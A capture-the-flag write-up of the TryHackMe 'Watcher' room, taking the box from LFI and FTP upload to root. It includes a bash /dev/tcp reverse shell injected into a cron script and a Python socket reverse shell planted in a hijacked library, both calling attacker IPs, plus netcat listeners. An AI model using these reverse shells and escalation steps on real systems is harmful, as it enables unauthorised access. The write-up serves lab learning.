# Watcher
[TryHackMe room link](https://tryhackme.com/room/watcher)

# Informations about the Room
> A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.

# Open ports
21 vsftpd 3.0.3 

22 ssh 

80 apache

# Enumeration

First of all we go to the `robots.txt` file to check for hidden and disallowed directories

```console
User-agent: *
Allow: /flag_1.txt FLAG{REDACTED}
Allow: /secret_file_do_not_read.txt 
```
We got the first flag

When we visit the second file the site gives a 403 but with can bypass it: 

We can see that the GET parameter in the url is vulnerable to LFI

`http://10.10.20.148/post.php?post=?`

With that we can list the file 

`http://10.10.20.148/post.php?post=secret_file_do_not_read.txt`

This file is a note left from user Will to Mat
```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:REDACTED
```
We obtained credentials for the FTP server

When we log in we see flag number 2 and a `files` directory, it's probably where the uploaded files are stored

It's possible to upload a php reverse shell to the machine and visit it abusing the LFI previously discovered

We set up a netcat listener on our machine
`nc -lnvp 4444`

We visit the link

`10.10.20.148/post.php?post=../../../home/ftpuser/ftp/files/shell.php`

And we get a shell on the listener

# Privilege Escalation

We are the user www-data so we cannot do much 

We try to search for flags 

`find / -name flag_3.txt`

The third flag is in the webroot:

`/var/www/html/more_secrets_a9f10a/flag_3.txt`

We upload linpeas to the machine to enumerate privilege escalation vectors

We discover that the user www-data can use all commands as user toby

```console
User www-data may run the following commands on watcher:
(toby) NOPASSWD: ALL
www-data@watcher:/$ sudo -u toby /bin/bash
```

In the `/etc/crontab` file we see that a script is executed every minute from the user mat and we have write access to that file

We set up a listener on our machine and modify the file by adding a reverse shell

```bash
sh -i >& /dev/tcp/10.8.37.155/9001 0>&1
```

Now we are user mat

We see a note left from will:
```console
mat@watcher:~$ cat note.txt 
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
mat@watcher:~$ sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

The python script can be executed as the will user

```python
mat@watcher:~$ cat /home/mat/scripts/will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
    print("Invalid command!")
    exit()

os.system(cmd)
```

The script imports a function from a custom library called `cmd.py`

```python
mat@watcher:~/scripts$ cat cmd.py
def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
```

With `ls -la` we can see that we have write access to this library file

We can hijack it and add a reverse shell to it

```python
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.50.72",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
```

We set up a listener again and we start the script

We receive a shell this time with the user will

Further enumeration with linpeas uncovered that a backup ssh key is stored in a `/opt/backups` folder:

```console
╔══════════╣ Readable files belonging to root and readable by me but not world readable                                                          
-rw-rw---- 1 root adm 2270 Dec  3  2020 /opt/backups/key.b64
```

We decode it:

```console
will@watcher:/dev/shm$ cat key.b64 | base64 -d | tee root_id_rsa
```

We upload it to our machine and we ssh as root
